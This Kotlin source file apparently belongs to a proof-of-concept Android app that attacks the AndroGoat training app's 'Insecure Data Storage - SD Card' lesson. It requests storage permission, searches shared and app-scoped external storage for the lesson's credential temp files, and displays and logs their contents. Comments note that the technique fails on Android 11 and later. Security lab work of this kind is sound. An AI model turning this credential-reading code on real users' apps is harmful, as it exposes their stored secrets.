package com.example.androgoatpoc.ui.ids

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import androidx.fragment.app.Fragment
import androidx.lifecycle.ViewModelProvider
import com.example.androgoatpoc.databinding.FragmentIdsBinding
import java.io.File

private const val TARGET_PKG = "owasp.sat.agoat"
private const val TAG = "AndroGoatPoC"

class InsecureDataStorageFragment : Fragment() {

    private var _binding: FragmentIdsBinding? = null
    private val binding get() = _binding!!

    // Runtime permission request must be registered during fragment initialization.
    private val requestPermission =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { granted ->
            if (granted) {
                scanForCredentials()
            } else {
                binding.textFilesContent.text =
                    "READ_EXTERNAL_STORAGE denied - cannot scan shared storage."
            }
        }

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        val vm = ViewModelProvider(this).get(InsecureDataStorageViewModel::class.java)
        _binding = FragmentIdsBinding.inflate(inflater, container, false)

        val textView: TextView = binding.textFilesContent
        vm.text.observe(viewLifecycleOwner) { textView.text = it }
        return binding.root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)

        binding.buttonGetSdcardFiles.setOnClickListener {
            val perm = Manifest.permission.READ_EXTERNAL_STORAGE
            if (ContextCompat.checkSelfPermission(requireContext(), perm)
                == PackageManager.PERMISSION_GRANTED) {
                scanForCredentials()
            } else {
                requestPermission.launch(perm)
            }
        }
    }

    /**
     * Looks for the temp file AndroGoat's "Insecure Data Storage - SD Card" lesson writes.
     *
     * AndroGoat writes it with File.createTempFile("users", "_tmp", getExternalFilesDir(null)),
     * i.e. into /sdcard/Android/data/owasp.sat.agoat/files/ -- the app-scoped external dir, NOT
     * the root of external storage. Two consequences on modern Android:
     *   - the root scan the original PoC did (getExternalStorageDirectory()) never sees it;
     *   - since API 30 (Android 11) scoped storage forbids one app from reading another app's
     *     Android/data/<pkg>/ subtree at all, even with MANAGE_EXTERNAL_STORAGE.
     * So this button can only succeed on Android 10 or older, or against an app that writes its
     * secrets to genuinely shared/public storage. We try both locations and report what happened.
     */
    private fun scanForCredentials() {
        val sb = StringBuilder()
        val filter = { _: File, name: String ->
            name.startsWith("users") && name.endsWith("tmp")
        }

        // (a) root of shared external storage - where a world-readable secret would land
        val sharedRoot = Environment.getExternalStorageDirectory()
        appendHits(sb, "shared root ($sharedRoot)", safeList(sharedRoot, filter))

        // (b) AndroGoat's app-scoped external dir - where it actually writes (blocked on API 30+)
        val victimDir = File(sharedRoot, "Android/data/$TARGET_PKG/files")
        appendHits(sb, "victim app dir ($victimDir)", safeList(victimDir, filter))

        if (sb.isEmpty()) {
            sb.append("No credential temp file could be read.\n\n")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                sb.append("This device is Android ${Build.VERSION.RELEASE} ")
                sb.append("(API ${Build.VERSION.SDK_INT}). Scoped storage blocks cross-app reads ")
                sb.append("of Android/data/$TARGET_PKG/, which is exactly where AndroGoat stores ")
                sb.append("the file. This technique only works on Android 10 or older, or against ")
                sb.append("apps that write to shared/public storage.")
            }
        }
        binding.textFilesContent.text = sb.toString()
    }

    private fun safeList(dir: File, filter: (File, String) -> Boolean): Array<File>? =
        try {
            dir.listFiles(filter)
        } catch (e: SecurityException) {
            Log.i(TAG, "SecurityException listing ${dir.path}: ${e.message}")
            null
        }

    private fun appendHits(sb: StringBuilder, where: String, files: Array<File>?) {
        when {
            files == null -> Log.i(TAG, "Cannot access $where (null / permission denied)")
            files.isEmpty() -> Log.i(TAG, "No matching files in $where")
            else -> for (f in files) {
                if (f.isFile) {
                    val content = try {
                        f.readText()
                    } catch (e: Exception) {
                        "<unreadable: ${e.message}>"
                    }
                    sb.append("Found in $where\nFile: ${f.name}\nContent:\n$content\n\n")
                    Log.i(TAG, "Leaked ${f.name}: $content")
                }
            }
        }
    }

    override fun onDestroyView() {
        super.onDestroyView()
        _binding = null
    }
}
